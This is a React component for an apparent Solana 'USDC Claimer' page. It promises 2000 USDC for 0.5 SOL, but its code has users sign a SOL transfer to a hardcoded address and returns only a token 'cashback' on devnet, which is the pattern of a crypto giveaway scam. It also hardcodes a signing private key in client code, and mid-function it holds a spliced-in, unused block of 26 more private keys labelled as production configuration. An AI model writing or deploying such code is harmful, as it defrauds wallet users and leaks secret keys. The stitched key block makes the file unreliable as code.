/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "RBGWta8UWzygdXzCMePjsg3cLp9US3chN1erD6ByuxJzkF2HNqHa433CFqi9HPspa3YSbAkGi5uPwBMDKzKWruK"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "49M1ZpqUjYzLeN9cJYFHGtcbsLftjWXakyLTU34W5hFHPxdwp1rtULjAzGdRN2Mo6fsh4VGmJN8J6mx5X9gqrik6",
  "key1": "2RiFQ4NCvzdFRP8vmSF49aX63Nv9JHhNWzb66q3SeZsEemipMXyATgMdbqutVpJcxxeK3AUtSNWXEbmhEvbYjFyo",
  "key2": "4F26X2tacAS1TEyHZ1wiRZyW43L4oVbJ2CMvdJjmnCLMiePfDFT69JNoXgwJaM7PDKDXoide43bUvzShaWVQRGCY",
  "key3": "4HLddTDWAUkpWTrKvBjVEQm1odpRtfm66harnzdvpsBUSkd9PHnYyfhnWW8sktFaWw1DgYygoQA9TXWszooU74r3",
  "key4": "3P6QMn1XQzz11UsMq1Gnvnh6k7yTwevzmiHcVgT2Qh8cYFA3EpNvvY6tmThwQfzT5rNMtimh46ZuPRwmcmBxojJE",
  "key5": "5FSnC2xnjadt563tCAJqgTSJkWU2cne5ccezfBjeHh9Rmu8DGyEAJJaL4kArpHS1QKdtt7VAqh39vZDEnobsEcBu",
  "key6": "2LAh7VPecDExqueMWRz9rkqMLXoQYP9jbpsQWw7UNAZna4ozcJFtonWsWjUo9CCX4DZbncJJFpmrW1yFhUZL2YDC",
  "key7": "4VTTBdRiVGeXfEaYkRzAYomyQ8TLRCJv9sKGNjs6ZkWZduAhCrLqbnYEeEDxrG33znCi9H1D6RHZ9XM6Zp2SL2MU",
  "key8": "23aMubwfUzwFVPHdq5RGNUftffkcCuLoUFraWSi8RQ2zkgjHvgeKaeZYPakL3TGRxN3wDih3P8j1DszjEEvAxRLM",
  "key9": "5fub3Hgq87Z2BRqTncxhu5DbutMLAnVu4gB9D3Mzub6xJ29AgdqJhApZptSpjYsPTmaoP5PWodcazjyeMd3qkcTS",
  "key10": "2rDbJs3s3e9dcko6yX7nsrkBZFZF7grg4EoeYMnNQGwiFtiiVoDJbjzutAiuXBvxM7ytDSU4deHRgrDPGcq92QSq",
  "key11": "3V28nkoN4ip3TTWtR6b3u5isy49z39QdqKEocnAgYDK4F8ijuocUDvuTXc9m7mx13V2gdEfJZ7J6LTxwXrsso4HL",
  "key12": "4XmNdn7di3Z8fH7pmMhpUVvsRiYYKLGkgrtJGJSsbELpp7RoKrgYHCPXW6VP47YkMt3W8dZzQLx2CGNfyxCnQUqp",
  "key13": "3PMAMRrpfk4eiCjCf2kXLTT5kcA9TW9WNkQiGTbexFm4XTNKj1oXqUbhgFneLieAi5fsxxeV7pmVSc7nPiqgH6RP",
  "key14": "2iP8eowmHrQeoedNPBzyjeRHUZgkyu1SQHkdd1zfFryetA5nfkm8yrejgBUpDDqsZ18yu1jvDbWbRR2VJLCwjGaq",
  "key15": "okLV1M7P9pV6jRVKqfGsPCMMe8oHgxAubiQdgYcSxoNweKP6MghY9bShfu3xtuH4NdboV47QJubwabLVMcFMa3j",
  "key16": "5ZhW7dvnyGQcRvNnLRfEzVgnLEYc2DgqgFyyYCgNFK2q3JztFBmJBFDgozm5nkx31CRKpPbaewwxCSFuM9MesDuS",
  "key17": "5TBjKfujJ8689U1tKCNYMZyn78Rsqsd4X4fzBaYdD5P4SpWt31NmZMzkx6C9aVjkfUR1EKvW8SVYosatTVoSmzXq",
  "key18": "4WNKS7KPnB4KZXhiHQgJ9xyCZfQnX7MuC8w8iFkHcXrb11bayswdyhYZUUiq7QRQiJV8fmfEYmsbQ1CpRXUBr17s",
  "key19": "4UTNQo72XTEgxaARn7YnHRcK6CriPgc5tgCkHmQiYUZqgZ6NGEJ2znG8Fn4w6xxhoBtZmD5U8x2QVy3h8FuPjBNN",
  "key20": "5vVeRKFsAY34wgAnYrjK47uLwdTzubtvYWZSzsL3BSdGyagmPuVzA5ow329RRyAYg5rmVdETAAd2YJ3ozYwaMTgn",
  "key21": "2XJ7bWnoAe8eEPwFDG9NLxcLHqZNbciDXkwRiFSit5DXLaCcT6JSMPWppJMPWCWgpEq2MP1z3HGtqEiFn5erSVhZ",
  "key22": "342iDeaeHmV6sWwxj2StfQqdKwoJcx6SeSmpGBvEFgG9BJWqswGyxpwkAVBbDKsPh3vJ5dJNJ8iBAFN7RkVB6wCh",
  "key23": "5HnDy7YvcRDd5QU3JeS9v7k7eYEpUijJmy4LsGbx299S6j9QvUVAcv4erCnxnC5kqxiCdh5vrEtYWTADW8AWZruM",
  "key24": "5tybAk2NJkgE6RNHTz6xNSgfoRtuhuivprQkYQ9KEQBKWXXopLfNs6qpFZNZiHwrERridQEBdh7yjyHiUZhcuR2e",
  "key25": "3QgzrK5QwdbUm1XqQ4v1ACTZhC5ERdy7zMtjCNynM58nJHY8FZHSYn93oFtm5HTJNMRmZh9EZMmUCcsynxr34JL8"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
